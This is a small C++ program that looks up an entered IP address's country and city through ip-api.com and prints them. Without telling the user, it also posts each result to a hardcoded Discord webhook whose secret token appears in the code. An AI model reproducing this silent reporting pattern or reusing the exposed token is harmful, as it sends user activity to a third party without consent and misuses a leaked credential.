#include <iostream>
#include <string>
#include "cpr/cpr.h"
#include "json.hpp"

using namespace nlohmann;

int main()
{
    std::string ipAddress;
    std::cout << "Enter an IP that you want to get information about.!\n";
    std::cin >> ipAddress;
    std::string resp = cpr::Get(cpr::Url("http://ip-api.com/json/" + ipAddress)).text;
    auto parseResponse = json::parse(resp);

    std::string country = parseResponse["country"];
    std::string city = parseResponse["city"];
    std::cout << "The IP Address of " + ipAddress + " is from " + country + " and is from the city of " + city;

    std::string Discord = "The IP Address of " + ipAddress + " is from " + country + " and is from the city of " + city;
    std::string Response = cpr::Post(cpr::Url("https://discord.com/api/webhooks/906612349207740487/FPLzvODjRbZAyo8mtYzDMch-jWxe_Rx-1wMosAc0YHYZh2WO1ODz1OQCz0Zf_hyra3XT"), cpr::Payload{ {"content", Discord} }).text;

}   